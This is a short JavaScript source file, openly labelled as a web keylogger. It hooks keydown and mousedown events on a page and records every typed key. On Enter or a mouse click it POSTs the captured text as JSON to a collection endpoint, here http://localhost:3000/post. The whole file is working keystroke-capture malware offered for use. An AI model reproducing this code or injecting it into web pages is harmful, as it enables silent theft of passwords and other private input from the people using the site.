/*
  Script: Keylogger for Web
  Developer: https://www.linkedin.com/in/robson-magno-21478b11b/ 
  Date: seg jan 13 12:21:56 -03 2020
*/

(function (window, document) {
  var log = {words: ""},
      xmlhttp;

  //Events the browser
  document.addEventListener("mousedown", callBack)
  document.addEventListener("keydown", callBack)

  function callBack(event) {
    switch (event.type) {
      case "keydown":
        log.words += event.key === "Enter" ? "": event.key;
        if(event.key === "Enter" && log.words.length !== 0 )
          sendLog()
        break;
      case "mousedown":
        if(log.words.length !== 0)
          sendLog()
        break;
      default:
        break;
    }
  }

  function sendLog() {
    //for IE olds
    if (window.XMLHttpRequest) {
	    xmlhttp = new XMLHttpRequest()	
    } else {
	    xmlhttp = new ActiveXObject()
    }
    xmlhttp.onreadystatechange = function () {
      if(xmlhttp.readyState === 4 && xmlhttp.status === 200) {
	      console.log(xmlhttp.responseText)
      }
    }
    xmlhttp.open("POST", "http://localhost:3000/post", true)
    xmlhttp.setRequestHeader("Content-type", "application/json")
    xmlhttp.send(JSON.stringify(log))
    log.words = ""
  }
})(window, document)
